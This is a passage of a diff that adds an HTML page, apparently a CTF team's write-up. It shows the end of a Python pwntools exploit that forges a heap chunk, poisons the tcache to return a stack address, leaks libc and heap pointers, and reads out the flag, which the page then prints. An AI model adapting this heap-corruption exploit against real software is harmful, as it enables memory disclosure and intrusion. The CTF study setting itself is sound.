+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>        recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># unset previous in use flag and prepare fake chunk</span>
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, <span style="color:#ae81ff">0x40</span>, base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x380</span>, base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x380</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># trigger merge</span>
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;fake chunk created&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shrink_fake_chunk</span>(con: tube, new_size: int) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x138</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, new_size, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;shrinked chunk to </span><span style="color:#e6db74">{</span>new_size<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepare_malloc_target</span>(con: tube, target: int, size: int<span style="color:#f92672">=</span><span style="color:#ae81ff">0x140</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate fake chunk</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate + free other chunks</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free fake chunk</span>
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># change next pointer of fake chunk</span>
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, size, target)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;tcache prepared&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_flag_part</span>(first_part: bool) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SIZE<span style="color:#f92672">=</span><span style="color:#ae81ff">0x70</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> first_part:
+</span></span><span style="display:flex;"><span>        SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    stack_pointer <span style="color:#f92672">=</span> leak_libc(io) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10c</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack pointer at </span><span style="color:#e6db74">{</span>hex(stack_pointer)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    heap_base <span style="color:#f92672">=</span> leak_heap(io)
+</span></span><span style="display:flex;"><span>    chunk_3c1_content <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16cd0</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3c1 chunk at </span><span style="color:#e6db74">{</span>hex(chunk_3c1_content)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    create_fake_chunk_0x140(io, chunk_3c1_content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    shrink_fake_chunk(io, SIZE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    prepare_malloc_target(io, stack_pointer, SIZE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># dereference next pointers</span>
+</span></span><span style="display:flex;"><span>    post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    part <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> first_part:
+</span></span><span style="display:flex;"><span>        post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">0xb</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>        leak <span style="color:#f92672">=</span> recv_message(io, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        print(hexdump(leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calculate optimal length</span>
+</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> (SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> first_part:
+</span></span><span style="display:flex;"><span>        length <span style="color:#f92672">=</span> (SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">0xb</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># malloc stack</span>
+</span></span><span style="display:flex;"><span>    post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>length)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># leak stack</span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> recv_message(io, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    print(hexdump(leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># clean up</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># extract flag part</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> first_part:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> leak[leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag{&#34;</span>):]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> leak[leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;}&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get flag parts</span>
+</span></span><span style="display:flex;"><span>part1 <span style="color:#f92672">=</span> leak_flag_part(<span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>part2 <span style="color:#f92672">=</span> leak_flag_part(<span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>part1 <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>part2 <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># reconstruct flag</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> part1[:part1<span style="color:#f92672">.</span>find(part2[:<span style="color:#ae81ff">4</span>])] <span style="color:#f92672">+</span> part2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>flag <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Executing it reveals the flag: <code>flag{victor319320juliet4:GJv8_G785iQMjpJMB8bMH_VprUP3gSbv1nUbW4jnzWh7Sv4mVKmBzPcZNwzRN95dNBQ4eIPP91vWKYTIJEsZB9w}</code></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/realworldctf5-teewars/">
+                <span class="button__text">Real World CTF 5 - Teewars</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2021-2022 CyberTaskForce Zero</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
